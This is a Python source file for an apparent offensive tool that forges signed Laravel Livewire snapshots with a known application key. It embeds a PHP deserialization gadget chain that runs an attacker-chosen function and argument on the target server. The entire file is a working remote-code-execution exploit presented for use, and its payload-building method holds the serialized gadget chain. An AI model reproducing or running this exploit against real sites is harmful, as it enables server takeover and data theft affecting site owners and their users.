import os
import hmac
import json
import hashlib

from jsonschema import validate, ValidationError
from lib.core.laravel_encrypter import LaravelEncrypter

__all__ = [
    "ExploitEncrypter"
]

"""
Class used to generate a valid checksum for a livewire instance
"""
class ExploitEncrypter:

    """
    A key can be defined directly    
    """
    def __init__(self, data, function, param, key=None):
        self.json_content = None
        if os.path.exists(data):
            with open(data, "r") as fd:
                self.json_content = json.loads(fd.read())
        else:
            self.json_content = json.loads(data)
        self.key = key
        self.function = function
        self.param = param
        self.laravel_encrypter = LaravelEncrypter(key)
        self.json_schema = {
            "type": "object",
            "properties": {
                "_token": {"type": "string"},
                "components": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "snapshot": {"type": "string"},
                            "updates": {"type": "object"},
                            "calls": {
                                "type": "array",
                                "items": {
                                    "type": "object",
                                    "properties": {
                                        "path": {"type": "string"},
                                        "method": {"type": "string"},
                                        "params": {"type": "array"}
                                    },
                                    "required": ["path", "method", "params"]
                                }
                            }
                        },
                        "required": ["snapshot", "updates", "calls"]
                    }
                }
            },
            "required": ["_token", "components"]
        }

    def checksum(self, snapshot):
        parsed_key = self.laravel_encrypter.retrieve_key(self.key)
        h = hmac.new( parsed_key, snapshot.encode("utf-8"), hashlib.sha256)
        return str(h.hexdigest())        

    def build_payload(self, snapshot):
        first_arg = list(snapshot['data'].keys())[0]
        snapshot['data'][first_arg] = [{"a":[{"__toString":"phpversion","close":[[[{"chained":["O:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":4:{s:5:\"dummy\";O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\u0000*\u0000events\";O:31:\"Illuminate\\Validation\\Validator\":1:{s:10:\"extensions\";a:1:{s:0:\"\";s:"+str(len(self.function))+":\""+self.function+"\";}}s:8:\"\u0000*\u0000event\";s:"+str(len(self.param))+":\""+self.param+"\";}s:10:\"connection\";N;s:5:\"queue\";N;s:5:\"event\";O:37:\"Illuminate\\Notifications\\Notification\":0:{}}"]},{"s":"form","class":"Illuminate\\Broadcasting\\BroadcastEvent"}],"dispatchNextJobInChain"],{"s":"clctn","class":"Laravel\\SerializableClosure\\Serializers\\Signed"}]},{"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"}],"b":[{"__toString":[[[None,{"s":"mdl","class":"Laravel\\Prompts\\Terminal"}],"exit"],{"s":"clctn","class":"Laravel\\SerializableClosure\\Serializers\\Signed"}]},{"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"}]},{"class":"League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator","s":"clctn"}]
        
        # Due to PHP weird json_encode() parsing, we must replace / by \/
        snapshot['checksum'] = self.checksum(json.dumps(snapshot).replace(" ","").replace("/","\/"))
        self.json_content['components'][0]['snapshot'] = json.dumps(snapshot).replace(" ","").replace("/","\/")

    def run(self):
        try:
            validate(instance=self.json_content, schema=self.json_schema)
            snapshot = json.loads(self.json_content["components"][0]["snapshot"])
            snapshot.pop("checksum")
            if not snapshot.get("data"):
                print("[-] Missing 'data' in snapshot, canno't continue.")
                return ""
            if len(snapshot.get('data').keys()) == 0:
                print("[-] Missing field in 'data' of snapshot, canno't continue.")
                return ""
            self.build_payload(snapshot)
            return json.dumps(self.json_content)
        except ValidationError:
            print("[-] JSON schema is not valid.\nJSON should match the following schema:")
            print(json.dumps(self.json_schema, indent=4))
            return ""
        except Exception as e:
            print(f"[-] Unexcepted error occured: {e}")
            return ""